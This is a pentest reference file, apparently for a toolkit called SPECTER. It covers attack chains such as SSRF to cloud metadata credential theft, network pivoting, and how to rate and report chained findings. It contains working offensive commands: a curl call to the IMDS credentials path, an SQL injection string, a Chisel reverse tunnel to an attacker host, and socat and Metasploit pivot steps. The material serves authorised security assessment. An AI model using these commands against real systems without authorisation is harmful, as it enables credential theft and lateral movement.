---
title: SPECTER — Attack Chains and Pivoting Reference
---

# Attack Chains and Pivoting Reference

Individual vulnerabilities rarely tell the full story. This reference documents
multi-step attack chains, network pivot techniques, and compound severity rules
for when findings combine into a kill chain.

---

## Common Attack Chains

### 1. SSRF → Cloud IMDS → Privilege Escalation

| Step | Finding | Severity |
|------|---------|---------|
| 1 | SSRF in web application — attacker controls a URL the server fetches | S2 |
| 2 | IMDS access via SSRF — `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | — |
| 3 | IAM credential extraction from IMDS response | — |
| 4 | Cloud privilege escalation (S3, EC2, IAM) | **S1** |

**Chain Severity:** S2 + misconfiguration → **S1** (critical when IMDSv1 enabled)
**Skills:** `web-misconfig-review`, `cloud-config-audit`, `exploit-validation`
**ATT&CK:** T1552.005 Cloud Instance Metadata API

```bash
# Proof of concept (IMDSv1)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: role-name → GET /role-name → AccessKeyId + SecretAccessKey
```

---

### 2. SQL Injection → Auth Bypass → Data Exfiltration

| Step | Finding | Severity |
|------|---------|---------|
| 1 | SQLi in login form — `' OR '1'='1` | S1 |
| 2 | Authentication bypass — log in as admin | — |
| 3 | PII / data dump to attacker endpoint | **S1** |

**Chain Severity:** S1 (elevated for PII — critical for GDPR/compliance)
**Skills:** `api-security-review`, `exploit-validation`
**ATT&CK:** T1190, T1078

---

### 3. Subdomain Takeover → Phishing → Credential Harvest

| Step | Finding | Severity |
|------|---------|---------|
| 1 | Dangling DNS CNAME pointing to deprovisioned cloud resource | S2 |
| 2 | Attacker claims the resource (S3 bucket, GitHub Pages, Heroku) | — |
| 3 | Phishing page hosted on trusted subdomain | — |
| 4 | Credential harvest — users trust the legitimate-looking domain | **S1 impact** |

**Chain Severity:** S3 solo → **S1** impact when chained
**Skills:** `indepth-recon-analysis`, `bug-bounty-triage`

---

### 4. Hardcoded Secret → Cloud Access → Lateral Movement

| Step | Finding | Severity |
|------|---------|---------|
| 1 | AWS / GCP key in git commit history or public repo | S1 |
| 2 | Cloud API access using stolen credentials | — |
| 3 | IAM role enumeration and cross-account assume | — |
| 4 | Data exfil or infrastructure destruction | **S1** |

**Chain Severity:** S1 always — hardcoded cloud credentials are never lower
**Skills:** `dependency-and-secret-audit`, `ci-cd-supply-chain-security`, `cloud-config-audit`

---

## Network Pivoting Techniques

### SSH Tunneling

```bash
# Local port forward — access internal service through bastion
ssh -L 8080:internal-server:80 user@bastion.example.com
# → visit http://localhost:8080 to reach internal-server:80

# Dynamic SOCKS proxy — route all traffic through bastion
ssh -D 1080 -f -C -q -N user@bastion.example.com
# → set browser/proxychains to socks5://127.0.0.1:1080
proxychains nmap -sT 10.0.1.0/24
```

### SOCKS Proxying via Compromised Host (Chisel)

```bash
# Attacker machine
./chisel server -p 8080 --reverse

# Compromised target
./chisel client attacker-ip:8080 R:socks
# → SOCKS5 proxy available at 127.0.0.1:1080 on attacker
```

### Port Forwarding with socat

```bash
# Forward all connections on attackerport:8080 → internalhost:80
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

### Port Forwarding with Metasploit

```
# After session established:
use post/multi/manage/autoroute
set SESSION 1
run

use auxiliary/server/socks_proxy
set SRVPORT 1080
run
# → route via proxychains 127.0.0.1:1080
```

---

## Chain Severity Calculation

| Individual Severities | Chain Severity | Condition |
|-----------------------|----------------|-----------|
| S3 + S4 | S2 | Combined reach a critical asset |
| S2 + S3 | S1 | Chain enables RCE, auth bypass, or data exfil |
| S4 + S4 + S4 | S2 | Three issues form a complete attack path |
| S2 (no auth) | S1 | Target holds PII **or** is internet-facing prod |
| S1 (any) | S1 | Always — never downgrade a chain containing S1 |

**Rule:** If a chain enables a critical goal (code execution, auth bypass, mass data
theft), report it as **S1 regardless of component severity**.

---

## Reporting Chained Findings

1. Report each individual finding with its standalone severity
2. Add a summary finding describing the chain:

```markdown
### F-CHN-001: Attack Chain — SSRF to Cloud Privilege Escalation

| **Title** | Attack Chain — SSRF to Cloud Privilege Escalation |
| **Severity** | S1 |
| **Confidence** | C1 |
| **Status** | Confirmed |
| **Category** | Attack Chain / T1552.005 |
| **Affected Target** | api.example.com + AWS account |
| **Issue Summary** | Findings F-003 (SSRF) and F-007 (IMDSv1 enabled) combine to allow an
external attacker to extract AWS IAM credentials by routing SSRF to the Instance
Metadata Service. |
| **Impact** | Full AWS API access under the EC2 instance role — S3 exfil, EC2 API calls,
and potential IAM privilege escalation. |
| **Remediation** | 1. Remediate F-003 (SSRF). 2. Enforce IMDSv2 on all EC2 instances
(`aws ec2 modify-instance-metadata-options --http-tokens required`). |
```

---

## Integration with SPECTER Skills

| Scenario | Primary Skill | Supporting Skills |
|----------|--------------|-------------------|
| SSRF chain | `web-misconfig-review` | `cloud-config-audit`, `exploit-validation` |
| Supply chain compromise | `ci-cd-supply-chain-security` | `dependency-and-secret-audit` |
| AD credential chain | `active-directory-and-identity-audit` | `network-infrastructure-pentest` |
| API auth bypass | `api-security-review` | `exploit-validation`, `bug-bounty-triage` |
| Container escape | `container-and-runtime-security` | `cloud-config-audit` |
